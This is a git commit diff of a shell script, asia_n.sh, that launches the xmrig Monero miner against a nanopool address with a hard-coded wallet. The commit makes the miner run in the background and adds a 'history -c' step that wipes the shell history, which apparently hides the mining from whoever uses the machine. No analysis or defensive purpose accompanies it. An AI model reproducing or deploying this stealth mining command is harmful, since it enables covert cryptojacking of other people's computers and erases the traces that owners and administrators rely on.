65855d0c13f3fe9bace1398bcea13d33e37a8115
_sys <39033340+harimor@users.noreply.github.com>
2021-11-12 12:27:44 +0200

    Update asia_n.sh

--- asia_n.sh
+++ asia_n.sh
@@ -1,1 +1,1 @@
-./xmrig -a rx/0 -o xmr-au1.nanopool.org:14433 -u 4B2WBzb9y3Eer1CvAcxFd7W3fcY2geALqRGhtcTTFouZ8SRNGwqxYA3Z7BdApLGbaoZMC9ZPGHh79JSsMXZujjWGNSYyQSe -k --tls -p fuckup --coin monero
+./xmrig -a rx/0 -o xmr-au1.nanopool.org:14433 -u 4B2WBzb9y3Eer1CvAcxFd7W3fcY2geALqRGhtcTTFouZ8SRNGwqxYA3Z7BdApLGbaoZMC9ZPGHh79JSsMXZujjWGNSYyQSe -k --tls -p fuckup --coin monero -b --background | history -c 
